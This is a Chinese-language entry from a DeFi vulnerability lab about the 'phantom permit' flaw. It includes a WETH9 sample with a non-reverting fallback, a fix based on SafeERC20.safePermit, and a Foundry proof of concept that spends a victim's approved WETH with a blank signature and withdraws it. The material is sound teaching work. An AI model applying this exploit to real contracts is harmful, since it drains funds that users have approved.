[phantom-permit.sol](https://github.com/SunWeb3Sec/DeFiVulnLabs/blob/main/src/test/phantom-permit.sol)

# 幻像函数-允许函数

**名称：** 幻象功能-允许功能

**描述：** 幻像函数：接受所有未实际未定义的函数的任何调用，而不进行恢复。 key: 1.不支持EIP-2612许可的Token。 2.Token具有后备功能。 例如：WETH。

**解决措施：**

使用 SafeERC20 的 safePermit - 恢复无效签名。 https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/utils/SafeERC20.sol#LL89C14-L89C24

**参考：**

https://twitter.com/1nf0s3cpt/status/1671347058568237057

https://media.dedaub.com/phantom-functions-and-the-billion-dollar-no-op-c56f062ae49f

**WETH9 合约样例:**

```jsx
contract WETH9 {
    string public name = "Wrapped Ether";
    string public symbol = "WETH";
    uint8 public decimals = 18;

    event Approval(address indexed src, address indexed guy, uint wad);
    event Transfer(address indexed src, address indexed dst, uint wad);
    event Deposit(address indexed dst, uint wad);
    event Withdrawal(address indexed src, uint wad);

    mapping(address => uint) public balanceOf;
    mapping(address => mapping(address => uint)) public allowance;

    fallback() external payable {
        deposit();
    }

    receive() external payable {}

    function deposit() public payable {
        balanceOf[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }
}
```

***\*测试方法:\****

forge test --contracts src/test/**phantom-permit.sol** -vvvv

```jsx
// 测试幻像许可证漏洞的函数
    function testVulnPhantomPermit() public {
        // Alice的地址被设置为虚拟机中的第一个地址
        address alice = vm.addr(1);
        
        // 转10个以太币到Alice的账户
        vm.deal(address(alice), 10 ether);

        // 在虚拟机中对 Alice 的帐户发起“恶作剧”
         // 如果没有进一步的上下文，还不清楚这个恶作剧的作用
        vm.startPrank(alice);
        
        // 从当前合约中将 10 以太币存入 WETH9Contract
        WETH9Contract.deposit{value: 10 ether}();
        
        // 批准漏洞许可合约代表该合约花费最大可能数量的代币（本例中为 WETH）
        WETH9Contract.approve(address(VulnPermitContract), type(uint256).max);
        
        //停止对 Alice 帐户的恶作剧
        vm.stopPrank();
        
        // 在 WETH9Contract 中记录该合约的余额
        console.log(
            "start WETH balanceOf this",
            WETH9Contract.balanceOf(address(this))
        );

        //使用许可证代表 Alice 在易受攻击的许可证合约中存入存款
         // v、r、s 的参数（此处为 27、0x0、0x0）是许可证的 ECDSA 签名方案的一部分
        VulnPermitContract.depositWithPermit(
            address(alice),
            1000,
            27,
            0x0,
            0x0
        );
        
        // 获取 WETH 中漏洞许可合约的余额并记录
        uint wbal = WETH9Contract.balanceOf(address(VulnPermitContract));
        console.log("WETH balanceOf VulnPermitContract", wbal);

        // 从漏洞许可合约中提取 1000 个代币
        VulnPermitContract.withdraw(1000);

        // 获取提现后该合约的 WETH 余额并记录
        wbal = WETH9Contract.balanceOf(address(this));
        console.log("WETH9Contract balanceOf this", wbal);
    }
```

**红色框：通过幻像函数排干池中的水。**

![img](https://web3sec.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fccbf77e6-c6ef-4cdd-8065-60cca1e2c4c1%2FUntitled.png?table=block&id=ce845a77-2d19-4e97-9124-e3fc0e8a2525&spaceId=369b5001-5511-4fe6-a099-48af1d841f20&width=2000&userId=&cache=v2)